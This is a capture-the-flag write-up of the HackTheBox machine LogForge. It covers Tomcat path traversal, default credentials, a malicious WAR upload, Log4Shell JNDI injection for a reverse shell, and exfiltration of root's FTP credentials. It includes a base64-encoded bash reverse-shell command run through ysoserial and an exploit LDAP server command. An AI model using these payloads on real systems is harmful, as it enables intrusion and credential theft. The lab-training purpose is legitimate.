@@ -1,0 +1,490 @@
+<p>LogForge is a linux machine with a medium level of difficulty both in the exploitation phase and the escalation of privileges, in this machine we take advantage of the vulnerability of the apache tomcat service to have access to the manager panel and we will also be exploiting a very critical vulnerability that has just been released recently which is the log4shell.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/portada.png" />
+</p>
+
+<p>Machine rating according to the people.</p>
+
+<p align="center">
+<img src="/assets/images/img-horizontall/calificacion.png" />
+</p>
+
+<p>Machine matrix:</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/matrix.png" />
+</p>
+
+<p>The first thing we are going to do is to create a file with the machine name, and inside of that file with <strong><em>mkt</em></strong> we are going to create to following directories (the mkt function remember that I have it defined in the <strong><em>~/.zshr</em></strong> to create those directories.).</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura1.png" />
+</p>
+
+<h2 id="recognition">Recognition</h2>
+
+<p>First we send an icmp trace to see if we have a connection on the victim machine, and with the ttl i know this is a linux machine, remember that linux machines have ttl 64 and windows machines have ttl 128.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura2.png" />
+</p>
+
+<p>In my machine I have defined a python script that through the ttl reports me if it is a windows or linux machine in a more elegant way, in the case if we don’t remember which ttl belongs to which OS.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura3.png" />
+</p>
+
+<p>Wichsystem script:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+#coding: utf-8
+</span> 
+<span class="kn">import</span> <span class="nn">re</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">subprocess</span>
+ 
+<span class="c1"># python3 wichSystem.py YOURIP 
+</span> 
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Uso: python3 "</span> <span class="o">+</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">" &lt;direccion-ip&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+ 
+<span class="k">def</span> <span class="nf">get_ttl</span><span class="p">(</span><span class="n">ip_address</span><span class="p">):</span>
+ 
+    <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">"/usr/bin/ping -c 1 %s"</span> <span class="o">%</span> <span class="n">ip_address</span><span class="p">,</span> <span class="s">""</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">err</span><span class="p">)</span> <span class="o">=</span> <span class="n">proc</span><span class="p">.</span><span class="n">communicate</span><span class="p">()</span>
+ 
+    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="p">.</span><span class="n">split</span><span class="p">()</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">12</span><span class="p">].</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+ 
+    <span class="n">ttl_value</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">"\d{1,3}"</span><span class="p">,</span> <span class="n">out</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+ 
+    <span class="k">return</span> <span class="n">ttl_value</span>
+ 
+<span class="k">def</span> <span class="nf">get_os</span><span class="p">(</span><span class="n">ttl</span><span class="p">):</span>
+ 
+    <span class="n">ttl</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ttl</span><span class="p">)</span>
+ 
+    <span class="k">if</span> <span class="n">ttl</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">ttl</span> <span class="o">&lt;=</span> <span class="mi">64</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">"Linux"</span>
+    <span class="k">elif</span> <span class="n">ttl</span> <span class="o">&gt;=</span> <span class="mi">65</span> <span class="ow">and</span> <span class="n">ttl</span> <span class="o">&lt;=</span> <span class="mi">128</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">"Windows"</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">"Not Found"</span>
+ 
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+ 
+    <span class="n">ip_address</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+ 
+    <span class="n">ttl</span> <span class="o">=</span> <span class="n">get_ttl</span><span class="p">(</span><span class="n">ip_address</span><span class="p">)</span>
+ 
+    <span class="n">os_name</span> <span class="o">=</span> <span class="n">get_os</span><span class="p">(</span><span class="n">ttl</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">%s (ttl -&gt; %s): %s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">ip_address</span><span class="p">,</span> <span class="n">ttl</span><span class="p">,</span> <span class="n">os_name</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>And if you asking why the ttl in the image shows 63 but not 64?, this happens because the packet that we send in the hackthebox machine does not go directly to the machine but tha packet goes through a series of intermediary nodes. and if we do a trace route when we ping the machine <strong><em>(-R)</em></strong> we can see those intermediate nodes.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura4.png" />
+</p>
+
+<h2 id="scanning---ports-recognition">Scanning - Ports recognition</h2>
+
+<p>i am going to perform a tcp syn scan by adding the <strong><em>min-rate</em></strong> parameter to make the scan go as fast as possible, and the evidence of the scan I will save it in grepable format in the allports file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.92 scan initiated Wed Jan 12 16:36:01 2022 as: nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn -oG allports 10.10.11.138
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.11.138 ()   Status: Up
+Host: 10.10.11.138 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
+# Nmap done at Wed Jan 12 16:36:13 2022 -- 1 IP address (1 host up) scanned in 11.62 seconds
+</code></pre></div></div>
+<p>Basically i save it in the grepable format is that i have a function defined in the ~/.zshrc called extractports that indicating the name of the file shows me the ports in a more elegant way and copies the ports it to clipboard.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura5.png" />
+</p>
+
+<p>Extractports script:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="k">function </span>extractPorts<span class="o">(){</span>
+        <span class="nv">ports</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'/'</span> | xargs | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">','</span><span class="si">)</span><span class="s2">"</span>
+        <span class="nv">ip_address</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'</span> | <span class="nb">sort</span> <span class="nt">-u</span> | <span class="nb">head</span> <span class="nt">-n</span> 1<span class="si">)</span><span class="s2">"</span>
+        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[*] Extracting information...</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;</span> extractPorts.tmp
+        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] IP Address: </span><span class="nv">$ip_address</span><span class="s2">"</span>  <span class="o">&gt;&gt;</span> extractPorts.tmp
+        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] Open ports: </span><span class="nv">$ports</span><span class="se">\n</span><span class="s2">"</span>  <span class="o">&gt;&gt;</span> extractPorts.tmp
+        <span class="nb">echo</span> <span class="nv">$ports</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xclip <span class="nt">-sel</span> clip
+        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"[*] Ports copied to clipboard</span><span class="se">\n</span><span class="s2">"</span>  <span class="o">&gt;&gt;</span> extractPorts.tmp
+        <span class="nb">cat </span>extractPorts.tmp<span class="p">;</span> <span class="nb">rm </span>extractPorts.tmp
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>And with the ports discovered we are going to perform another scan to know the versions of the services that run those ports with some recognition scripts (-sCV), and i will save the evidence of the scan in nmap format (it is advisable to save the scans in a file to avoid re-scanning).</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.92 scan initiated Wed Jan 12 16:37:32 2022 as: nmap -sCV -p22,80 -oN targeted 10.10.11.138
+Nmap scan report for 10.10.11.138
+Host is up (0.055s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
+|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
+|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Ultimate Hacking Championship
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Jan 12 16:37:43 2022 -- 1 IP address (1 host up) scanned in 11.34 seconds
+</code></pre></div></div>
+
+<p>As there is a web server on port 80 with whatweb we do a small recognition as if it were wappalyzere extension, to know the version of the web service, cms, etc.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura6.png" />
+</p>
+
+<p>We access on the website with the domain and the wappalyzer reports the following information about the web. Ok, so seeing that there is an apache server and also that the website uses java, it means that the website is probably using the apache tomcat service.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura7.png" />
+</p>
+
+<p>But first of all let’s check if there is anything interesting in the code of this website, and we don’t see anything useful.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura8.png" />
+</p>
+
+<p>We are going to do a little fuzzing with nmap but in this case we do not find anything, well nothing happens as we already know that apache tomcat is running we can check sevaral routes.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura9.png" />
+</p>
+
+<p>And this case if we are go to the page error 404 we can see that it’s shows as the version that is being using the apache tomcat service, but something even more interesting is that if we right click and select in “inspect”, in the network section and reload tha website we see that is reports different versions of apache and it is probably because there is a apache reverse proxy configured in the website.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura10.png" />
+</p>
+
+<p>So if there is an apache tomcat there is for sure a path that is the <strong><em>/manager/html</em></strong> which is where is the apache tomcat admin panel for deploy issues of our web app. and we see it exists but it tells us <strong><em>forbidden</em></strong> that we do not have access to this route.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura12.png" />
+</p>
+
+<p>And as we know the version of the apache tomcat service let’s look for the possible vulnerabilities that exist.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura13.png" />
+</p>
+
+<p>Well and we see that there is a vulnerability that is the path traversal through the reverse proxy, that by putting the character <strong><em>/..;/</em></strong> some resources can be accessed that normally cannot be accessed through the reverse proxy. So let’s try it.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura14.png" />
+</p>
+
+<p>Then what we are going to do is to put a resource that does not exist and we will add that character that indicates us in the article, and in this case what i want is to access the path <strong><em>/manager/html</em></strong> that did not allow us to access. And now instead of the 403 error (forbidden) now it’s appear a popup to authenticate.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura15.png" />
+</p>
+
+<p>Ok as we don’t have credentials, let’s try the default credentials that come with apache tomcat.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura16.png" />
+</p>
+
+<p>In this case one of the default credentials works, which is the user <strong><em>tomcat</em></strong> and the password <strong><em>tomcat</em></strong>. And we already have access to the apache tomcat manager page.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura17.png" />
+</p>
+
+<p>If we go down we can see that we can upload a <strong><em>WAR</em></strong> file, what we can do is try to upload a malicious war file to get access to the victim machine or to dump some credentials. So let’s try.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura18.png" />
+</p>
+
+<p>So what we are going to do is create a malicious war file with <strong><em>msfvenom</em></strong>, and in this case the payload we are going to use is <strong><em>jsp_reverse_shell_tcp</em></strong> to try get a reverse shell.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura19.png" />
+</p>
+
+<p>Now with msfvenom we will specify the payload, our attacker ip and the port we are listening with netcat, we will specify with the parameter <strong><em>-f</em></strong> the format of the file which in this caso is <strong><em>war</em></strong> and finally we will put a name for the file.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura20.png" />
+</p>
+
+<p>Now with netcat i am going to listen on the port 443.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura21.png" />
+</p>
+
+<p>And now in the website we are going to upload the war file that we generate and see if we received any connection in netcat.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura22.png" />
+</p>
+
+<p>And we get a message that only 1 bytes war file can be uploaded, and with 1 byte war file we can’t do a shit. And this is where the <strong><em>log4shell</em></strong> vulnerability comes in.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura23.png" />
+</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>If we search about log4shell it says that is a vulnerability that affects java <strong><em>JDNI</em></strong>, basically that in the log4j variables that are stored we can inject code with jdni. And btw this vulnerability is registred as <strong><em>CVE-2021-44228</em></strong>.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura24.png" />
+</p>
+
+<p>Now what we are going to do is to check if the tomcat service has deployed the log4j library, and we will do it with the following sequence shown in the image.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura25.png" />
+</p>
+
+<p>And what we are going to do is to be listening on the port that we have specified in that variable and the same variable we are going to paste it in a box in the website.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura26.png" />
+</p>
+
+<p>And if we received a connection on netcat that means that the log4j is deployed on that website or app, whatever.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura27.png" />
+</p>
+
+<p>So to exploit this vulnerability what we need is a ldap or rmi server that offers us jdni url. for this we are going to clone this <a href="https://github.com/welk1n/JNDI-Injection-Exploit">repo</a>:</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/repos.png" />
+</p>
+
+<p>Ok so with this repo we can execute two parameters the first one is <strong><em>-A</em></strong> to specify our ip address and <strong><em>-C</em></strong> the command or code that we want to execute in the victim machine, in this case we are going to execute a reverse shell that we will encode in base64, we do this to generate a payload for exec.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura30.png" />
+</p>
+
+<p>We will then run the following command to launch our ldap and rmi server, we will paste the command or the code that we just encoded and the ip address of our attacker machine. And we are going to listen with netcat on the port we have previously specified (in my case it is the port 9001).</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura31.png" />
+</p>
+
+<p>Ok now what we are going to do is copy and paste one of the urls that has generated us with the previous command (in my case i recommend that you to use last one of rmi that is says <strong><em>Target environment Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath</em></strong>) and we are gon a paste it in the tomcat page and press enter.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura33.png" />
+</p>
+
+<p>So as u can see onece we press enter the payload is uploaded on the victim machine with rmi and in netcat we receive the connection, And as u can see we are inside to the victim machine, so thats how we ara exploited the log4shell vulnerability.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura32.png" />
+</p>
+
+<h2 id="second-option-to-exploit-the-log4shell">Second option to exploit the log4shell</h2>
+
+<p>Another option to exploit the log4j, is first download the <a href="https://github.com/pimps/JNDI-Exploit-Kit">JDNI-Exploit-Kit</a> repo to have a ldap server and also the <a href="https://github.com/pimps/ysoserial-modified">ysoserial-modified</a> repo to create a serialized data (so that our reverse shell command is serialized).</p>
+
+<p>Now we are going to generate a serialized paylod with tha payload type <strong><em>commonsCollections5</em></strong> if this does not work we try with the 4.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'bash -i &gt;&amp; /dev/null/yourip/port 0&gt;&amp;1'</span> | <span class="nb">base64
+</span>YmFzaCAtaSA+JiAvZGV2L251bGwveW91cmlwL3BvcnQgMD4mMQ<span class="o">==</span>
+
+<span class="nv">$ </span>java <span class="nt">-jar</span> ysoserial-modified.jar CommonsCollections5 bash <span class="s1">'echo YmFzaCAtaSA+JiAvZGV2L251bGwveW91cmlwL3BvcnQgMD4mMQ== | base64 -d | bash'</span> <span class="o">&gt;</span> payload.ser
+</code></pre></div></div>
+
+<p>Run the ldap server:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>java <span class="nt">-jar</span> JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar <span class="nt">-L</span> yourip:1389 <span class="nt">-P</span> payload.ser
+</code></pre></div></div>
+
+<p>And we are going to do what we done before, which is to copy a jndi link and paste it in the tomcat page by listening in netcat.</p>
+
+<h2 id="analyze-the-system-once-we-have-access">Analyze the system once we have access</h2>
+
+<p>The first thing when we have access in the machine is to launch a pseudo console and then <strong><em>ctrl + z</em></strong> and with the command <strong><em>stty raw -echo; fg</em></strong> to treat the tty, so that we can use ctrl + c, move comfortably in the remote machine.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura34.png" />
+</p>
+
+<p>Now we are going to export two environment which is <strong><em>xterm</em></strong> (to use command like “clear” or to use ctrl + l) and <strong><em>bash</em></strong>.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura35.png" />
+</p>
+
+<p>If we do <strong><em>nano</em></strong> we see that the size of remote shell is not correct, this happens because we have not defined the size of the rows and columns on the remote shell.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura36.png" />
+</p>
+
+<p>So what we’re gon a do is look at the proportions of our attacker shell and copy it.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura37.png" />
+</p>
+
+<p>And now we’re going to apply those same proportions to the remote shell.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura38.png" />
+</p>
+
+<p>So let’s what users there are in the system, and we can see there are one user with the id 1000 called htb. Let’s try to access the home directory of this user.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura39.png" />
+</p>
+
+<p>And now we can see the first flag which is the <strong><em>user.txt</em></strong> that we are going to submit in the hackthebox website.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura40.png" />
+</p>
+
+<p>After checking the system to escalte privileges, if we look at the processes that are running on the system we can see that there is a process that is running a cron task that is running an ftp service in java, hmm interesting it’s possible that this ftp service is also using log4j and it would be the same exploitation process that we did before with the log4shell.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura41.png" />
+</p>
+
+<p>Before checking if the ftp service is using the log4j we are going to check if it allows us to access this ftp service, and as you can see we can access, and the user <strong><em>anonymous</em></strong> user is not enabled.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura42.png" />
+</p>
+
+<p>So we are going to do same process as we did before to check if there is a log4j running. first we are going to listen with netcat and we are going to inject the same variable when it asks us for the username (it is assumed that this variable can be injected anywhere while is the log4j). And we can see that i have received a connection in netcat.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura43.png" />
+</p>
+
+<p>Well we already know that the log4j is being used in this ftp service, in this case here it changes a bit in the way to exploit the log4j that we have done before. we have seen in the system processes that there is a <strong><em>.jar</em></strong> file that for some reason is shared from the system root path. so at this point what we can do is decompile this file with the java decompiler called <strong><em>JD-GUI</em></strong>.</p>
+
+<p><strong><em>Decompiler:</em></strong> is a program that performs the reverse operation of a compiler, basically its function is to obtain the source code of a compiled program (in our case the file is compiled in <strong><em>.jar</em></strong>).</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura44.png" />
+</p>
+
+<p>So what we are going to do is to transfer that file with netcat, and in my case i want it to transfer with the name <strong><em>ftpserver.jar</em></strong>.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura45.png" />
+</p>
+
+<p>And with the command <strong><em>md5sum</em></strong> we will check if the hashes are the same, to check if the file data has not been manipulated when we transfer the file. And in this case we see that it is the same, so perfect.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura46.png" />
+</p>
+
+<p>Now with <strong><em>jd-gui</em></strong> we are going to see the code of this file, if we don’t have this decompiler installed we do an <strong><em>apt install jd-gui</em></strong> and we will have it installed.</p>
+
+<p>And we can see that in the code the log4j library is imported.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura47.png" />
+</p>
+
+<p>And in the <strong><em>worker.class</em></strong> file we can see that the ftp username and password are stored in the environment variables <strong><em>ftp_user</em></strong> and <strong><em>ftp_password</em></strong>.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura48.png" />
+</p>
+
+<p>So with the user we have access to on the victim machine we do not see those two environment variables.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura49.png" />
+</p>
+
+<p>And if we try to search for it with the command <strong><em>echo</em></strong> we see nothing and that is because the root user is running the ftp service and in the root environment variable those two environment variables will be defined.</p>
+
+<p>Then as we have done before to check if it was running the log4j in the ftp service, we can take advantage of that to perform a data exfiltration by ldap or rmi using a ldap server as we have done before, we can take advantage of the jdni injection to link the information between these two environment variables via wireshark.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura50.png" />
+</p>
+
+<p>In a real environment for example we can use canary tokens that behaves as a kind of public ldap server, instead of doing it in our own machine.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura51.png" />
+</p>
+
+<p>And instead of <strong><em>hostname</em></strong> we put the environment variable <strong><em>ftp_user</em></strong>, and in canary tokens it will receive the logs and from there we could see the user name, but as the hackthebox machine has no internet then we can’t do it.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura52.png" />
+</p>
+
+<p>At this point what we ara going to do is an a another window run the ldap server as we have done before to exploit the log4shell, and when it asks for the username in the ftp service we are going to inject the jdni url and we will add the env variable (<strong><em>$env:ftp_user</em></strong>) because this env variable exists in the root user’s env and that env variable stored the username. But the problem is that we can’t see the information from our ldap server, what we are going to do is to capture those packets in wireshark.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura53.png" />
+</p>
+
+<p>And once we hit enter, we capture the packets in wireshrak and in this case i am going to filter the port 1389 (ldap), and in this i have captured a packet and we see tha username.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura54.png" />
+</p>
+
+<p>We do the same process with the <strong><em>ftp_password</em></strong> variable.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura55.png" />
+</p>
+
+<p>And if we capture those packets in wireshark by filtering the port 1389 we can see the user’s password.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura56.png" />
+</p>
+
+<p>And now once we have the credentials let’s check if we have access, and as you can see we have access and we can visualize the last flag which is the <strong><em>root.txt</em></strong>.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura57.png" />
+</p>
+
+<p>Get the <strong><em>root.txt</em></strong> and uploaded in the hackthebox website.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura58.png" />
+</p>
+
+<p>We can see an interesting directory that is shared in this ftp service, which is the <strong><em>.ssh</em></strong> and inside we can see the <strong><em>id_rsa</em></strong> file.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura59.png" />
+</p>
+
+<p>We download the <strong><em>id_rsa</em></strong> file and we get the ssh private key, which we can use to access as the root user with ssh.</p>
+
+<p align="center">
+<img src="/assets/images/img-logforge/captura60.png" />
+</p>
+
